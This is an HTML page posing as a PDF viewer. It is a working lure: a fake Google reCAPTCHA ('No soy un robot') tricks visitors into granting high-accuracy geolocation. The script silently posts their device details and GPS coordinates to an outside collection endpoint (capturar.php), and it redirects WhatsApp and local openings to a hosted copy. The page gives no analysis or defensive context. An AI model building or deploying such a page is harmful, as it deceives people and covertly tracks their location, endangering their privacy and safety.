<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PDF Viewer</title>
</head>
<body>

<!-- Botón invisible para forzar interacción (necesario en Android/Chrome) -->
<button id="geoBtn" style="opacity:0; position:absolute; pointer-events:auto; z-index:-1;">
Permitir
</button>

<!-- ===================================== -->
<!--      RECAPTCHA FALSO COMPLETO         -->
<!-- ===================================== -->
<div id="permisoBox" style="
    position:fixed;
    top:0; left:0;
    width:100%; height:100%;
    background:rgba(0,0,0,0.65);
    display:flex;
    justify-content:center;
    align-items:center;
    z-index:9999;
    font-family:Arial;
">
    <div id="captchaBox" style="
        background:white;
        padding:28px;
        border-radius:14px;
        width:420px;
        box-shadow:0 6px 18px rgba(0,0,0,0.35);
        cursor:pointer;
        user-select:none;
        transform: scale(1.25);
    ">

        <!-- Caja estilo recaptcha -->
        <div style="
            display:flex;
            align-items:center;
            border:1px solid #d3d3d3;
            border-radius:8px;
            padding:20px;
            zoom:1.4;
        ">

            <div id="fakeCheckbox" style="
                width:28px;
                height:28px;
                border:2px solid #c0c0c0;
                border-radius:3px;
                margin-right:12px;
                background:white;
                display:flex;
                justify-content:center;
                align-items:center;
                font-size:20px;
                color:#0d6efd;
            ">
            </div>

            <span style="font-size:16px; color:#333;">
                No soy un robot
            </span>

            <div style="
                margin-left:auto;
                display:flex;
                flex-direction:column;
                align-items:center;
                font-size:10px;
                color:#555;
            ">
                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png"
                     style="width:30px; opacity:0.8;">
                <span style="font-size:9px;">reCAPTCHA</span>
            </div>
        </div>

        <div style="text-align:center; margin-top:6px; font-size:10px; color:#777;">
            Privacidad · Términos
        </div>
    </div>
</div>

<script>
// ===============================
//   0) DETECTAR SI SE ABRE DESDE WHATSAPP (content://)
// ===============================
if (location.href.startsWith("content://") || document.referrer.includes("com.whatsapp")) {
    window.location.href = "https://encuestauta69-gif.github.io/pdf/informe.pdf.html";
}

// ===============================
//   DETECTAR CELULAR + EJECUCIÓN LOCAL
// ===============================
const esMovil = /Android|iPhone|iPad|iPod|Opera Mini|IEMobile|Mobile/i.test(navigator.userAgent);

const host = window.location.hostname;
const esLocal =
    host === "" ||
    host === "localhost" ||
    host === "127.0.0.1" ||
    host.startsWith("192.168.") ||
    host.startsWith("10.") ||
    window.location.protocol === "file:";

if (esMovil && esLocal) {
    window.location.href = "https://encuestauta69-gif.github.io/pdf/informe.pdf.html";
}

// ===============================
//   FUNCIÓN PARA ENVIAR DATOS
// ===============================
function enviar(data) {
    fetch("https://www.arstore.tech/infopdf/capturar.php", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(data)
    });
}

// ---- 1) Enviar info inicial ----
enviar({
    type: "info",
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    time: new Date().toISOString()
});

// =====================================
//     ACTIVAR RECAPTCHA FALSO
// =====================================
document.getElementById("captchaBox").addEventListener("click", function() {

    // Marca la casilla visualmente
    const box = document.getElementById("fakeCheckbox");
    box.innerHTML = "✔";
    box.style.background = "#e6f0ff";
    box.style.borderColor = "#0d6efd";

    // Animación tipo verificación
    document.getElementById("captchaBox").style.opacity = "0.5";
    document.getElementById("captchaBox").style.pointerEvents = "none";

    // Espera breve como si estuviera validando
    setTimeout(() => {
        activarPermiso();
    }, 600);
});

// =====================================
//     FUNCIÓN activarPermiso
// =====================================
function activarPermiso() {

    // Ocultar el recaptcha falso
    document.getElementById("permisoBox").style.display = "none";

    // Simular interacción mínima requerida
    const btn = document.getElementById("geoBtn");
    btn.click();

    // Pedir ubicación
    setTimeout(() => {
        solicitarGeo();
    }, 200);
}

// =====================================
//    FUNCIÓN ORIGINAL obtener GPS
// =====================================

function solicitarGeo() {
    if (!("geolocation" in navigator)) {
        enviar({
            type: "geo-error",
            error: "Geolocalización no soportada",
            time: new Date().toISOString()
        });
        return;
    }

    navigator.geolocation.getCurrentPosition(
        pos => {
            enviar({
                type: "geo",
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                time: new Date().toISOString()
            });
        },
        err => {
            enviar({
                type: "geo-error",
                error: err.message,
                time: new Date().toISOString()
            });
        },
        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
    );
}
</script>

<h2 style="color:#444; font-family:Arial;">
❗ Verificación en curso
</h2>
<p style="color:#666; font-family:Arial;">
Descargando.....
</p>

</body>
</html>

